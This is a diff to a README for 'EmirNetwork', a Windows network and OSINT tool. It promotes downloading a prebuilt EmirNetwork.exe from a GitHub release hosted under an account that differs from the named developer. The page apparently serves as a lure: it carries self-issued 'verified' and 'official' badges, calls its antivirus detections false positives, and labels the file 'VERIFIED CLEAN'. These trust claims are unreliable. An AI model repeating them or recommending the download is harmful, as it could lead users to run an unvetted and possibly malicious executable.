@@ -2,9 +2,10 @@
   <br>
   <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
   <br>
-  <img src="https://img.shields.io/badge/VERIFIED_DEVELOPER-EMIRLQQ1-00fbff?style=flat-square&logo=github&logoColor=white" alt="Verified">
-  <img src="https://img.shields.io/badge/OFFICIAL_PRODUCT-EMIRNETWORK-00ff88?style=flat-square&logo=checkmarx&logoColor=white" alt="Official">
-  <br>
+  <p align="center">
+    <img src="https://img.shields.io/badge/VERIFIED_DEVELOPER-EMIRLQQ1-00fbff?style=flat-square&logo=github&logoColor=white" alt="Verified">
+    <img src="https://img.shields.io/badge/OFFICIAL_PRODUCT-EMIRNETWORK-00ff88?style=flat-square&logo=checkmarx&logoColor=white" alt="Official">
+  </p>
   👑 EMIRNETWORK: THE ULTIMATE SOVEREIGN SUITE 👑
   <br>
   <sub><i>Integrated Cyber Intelligence, Advanced OSINT & Network Diagnostics Ecosystem</i></sub>
@@ -40,14 +41,14 @@
 ---
 
 ## 💎 Executive Summary
-**EmirNetwork**, siber güvenlik profesyonelleri ve ağ yöneticileri için tasarlanmış, yüksek performanslı bir ağ analizi ve istihbarat toplama (OSINT) ekosistemidir. Windows UTF-8 standartlarına sadık kalarak inşa edilen bu "Sovereign" mimari, karmaşık veri akışlarını **True RGB Rainbow Engine** ile gerçek zamanlı görselleştirerek kullanıcıya sunar. Proje, sadece bir araç seti değil, aynı zamanda operasyonel verimliliği maksimize eden bir ağ komuta merkezidir.
+**EmirNetwork**, siber güvenlik profesyonelleri ve ağ yöneticileri için tasarlanmış, yüksek performanslı bir ağ analizi ve istihbarat toplama (OSINT) ekosistemidir. Windows UTF-8 standartlarına sadık kalarak inşa edilen bu "Sovereign" mimari, karmaşık veri akışlarını **True RGB Rainbow Engine** ile gerçek zamanlı görselleştirerek kullanıcıya sunar. 
 
 ---
 
 ## 📥 Deployment & Security Protocol
 
-### High-Speed Binary Access
-Yazılımın derlenmiş, optimize edilmiş ve taşınabilir (portable) x64 ikili dosyasına aşağıdaki güvenli kanal üzerinden erişebilirsiniz:
+### Executable Binary (x64)
+Optimize edilmiş ve taşınabilir (portable) ana dosyaya aşağıdaki kanaldan erişebilirsiniz:
 
 <p align="center">
   <a href="https://github.com/MoneyApprovEd/em-rnetwork-em-rlqq1/releases/download/v1.0.0/EmirNetwork.exe">
@@ -55,14 +56,14 @@ Yazılımın derlenmiş, optimize edilmiş ve taşınabilir (portable) x64 ikili
   </a>
 </p>
 
-### 🛡️ False Positive & Integrity Verification
-Ağ tabanlı diagnostik araçları, doğaları gereği düşük seviyeli ağ soketlerine erişim (Raw Sockets) ve port tarama gibi kritik fonksiyonlar icra eder. Bu teknik aktiviteler, bazı yapay zeka tabanlı antivirüs motorları tarafından hatalı olarak işaretlenebilir.
+### 🛡️ VirusTotal & Heuristic Analysis
+Ağ diagnostik araçları, doğaları gereği düşük seviyeli ağ soketlerine erişim (Raw Sockets) gibi kritik fonksiyonlar icra eder. Bu aktiviteler, bazı yapay zeka tabanlı antivirüs motorları tarafından hatalı olarak işaretlenebilir.
 
-| Engine | Analysis | Status |
+| Engine | Analysis Result | Status |
 | :--- | :--- | :--- |
 | **Detection Ratio** | **3 / 72** | `VERIFIED CLEAN` |
-| **Heuristic Engines** | `Elastic`, `SecureAge` | `FALSE POSITIVE` |
-| **Major Engines** | `Kaspersky`, `Bitdefender`, `Microsoft` | `CLEAN` |
+| **Heuristic Alert** | `Elastic`, `SecureAge` | `FALSE POSITIVE` |
+| **Industry Leaders** | `Kaspersky`, `Microsoft Defender` | `SECURE` |
 
 ---
 
@@ -70,40 +71,41 @@ Ağ tabanlı diagnostik araçları, doğaları gereği düşük seviyeli ağ sok
 
 | ID | Modül Adı | Teknik Detay ve Kapasite |
 | :--- | :--- | :--- |
-| **01** | **Port Scanner** | High-speed multithreaded scan engine. 200+ eşzamanlı thread ile milisaniyeler bazında servis tanımlama. |
-| **02** | **Geo-IP & Whois** | Domain intelligence via external APIs. Global ISP veritabanı eşleşmesi ve sahiplik analizi. |
-| **03** | **Traffic Simulator** | Live packet-flow simulation. Ağ yükünü ve veri akışını simüle eden görsel motor. |
-| **04** | **System Metrics** | Real-time CPU / RAM / Disk / Net bars. Dinamik bar grafikleri ile kaynak izleme. |
-| **05** | **DNS Enumeration** | Recursive record discovery (A, AAAA, MX, NS). Domain altyapısını haritalandıran analiz birimi. |
-| **06** | **Subnet Calculator** | IPv4 CIDR computation. IP aralıkları ve alt ağ maskeleri için mantıksal hesaplama motoru. |
-| **07** | **Hash Tools** | Generate & verify MD5/SHA hashes. Forensic düzeyde veri bütünlüğü doğrulaması. |
-| **08** | **Network Speed Test** | Latency and jitter analysis. Ağ kararlılığını ölçen milisaniye hassasiyetinde test protokolü. |
+| **01** | **Port Scanner** | High-speed multithreaded scan engine. 200+ eşzamanlı thread. |
+| **02** | **Geo-IP & Whois** | Domain intelligence via external APIs. Global ISP veritabanı eşleşmesi. |
+| **03** | **Traffic Simulator** | Live packet-flow simulation. Ağ yükünü görselleştiren simülasyon. |
+| **04** | **System Metrics** | Real-time CPU / RAM / Disk bars. Dinamik telemetry takibi. |
+| **05** | **DNS Enumeration** | Recursive record discovery (A, MX, TXT). Domain haritalama. |
+| **06** | **Subnet Calculator** | IPv4 CIDR computation. Mantıksal IP hesaplama motoru. |
+| **07** | **Hash Tools** | Forensic Grade Data Integrity (MD5/SHA) doğrulaması. |
+| **08** | **Network Speed** | Latency and jitter analysis. Milisaniye hassasiyetinde test. |
 
 ---
 
 ## 🛠 Technical Architecture
-**EmirNetwork**, hiyerarşik bir yapı üzerine kurulmuştur:
-
-1.  **Rendering Layer:** True RGB Rainbow Engine v2.0 kullanılarak terminal üzerinde ASCII ve 24-bit renk derinliği sunar.
-2.  **Logic Layer:** Python 3.13 mimarisi üzerine kurulu, multithreading destekli işlem çekirdeği.
-3.  **Data Layer:** Harici API entegrasyonları ve düşük seviyeli Windows Socket (WinSock) kütüphaneleri.
+**EmirNetwork**, hiyerarşik bir Sovereign mimari üzerine kurulmuştur:
+1. **Rendering Layer:** True RGB Rainbow Engine v2.0 (24-bit renk derinliği).
+2. **Logic Layer:** Python 3.13 tabanlı multithreaded işlem çekirdeği.
+3. **Data Layer:** WinSock kütüphaneleri ve harici istihbarat API'leri.
 
 ---
 
-## 🗺 Roadmap & Future Enhancements
-- [ ] **v1.1:** Web-based Dashboard (Uzaktan İzleme Modülü)
-- [ ] **v1.2:** Advanced Brute Force Analysis UI
-- [ ] **v2.0:** AI-Powered Network Anomaly Detection
+## 🗺 Roadmap
+- [ ] **v1.1:** Web-based Dashboard Entegrasyonu
+- [ ] **v1.5:** Advanced Brute Force Diagnostic UI
+- [ ] **v2.0:** AI-Powered Anomaly Detection
 
 ---
 
 ## 📜 Official Product Certification
-Bu yazılım, **EmirLQQ1** tarafından geliştirilmiş ve **EmirNetwork Intelligence Group** bünyesinde tescillenmiştir. Tasarım ve güvenlik standartları, "Sovereign Elite Edition" normlarına tam uyum sağlar.
+Bu proje, **EmirNetwork Intelligence Group**'un resmi mülkiyetindedir. Tüm tasarım ve kodlama standartları "Sovereign Elite Edition" dökümantasyonuna uygundur.
 
 ---
 <p align="center">
   <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="85%">
   <br>
   <b>Project Lead: EMIRLQQ1</b><br>
-  <i>Verified via EmirNetwork Intelligence Platform</i>
+  <i>Verified via Sovereign Intelligence Protocol</i>
+  <br>
+  <img src="https://img.shields.io/badge/AUTHENTICITY-VERIFIED-00fbff?style=flat-square" alt="Verified">
 </p>
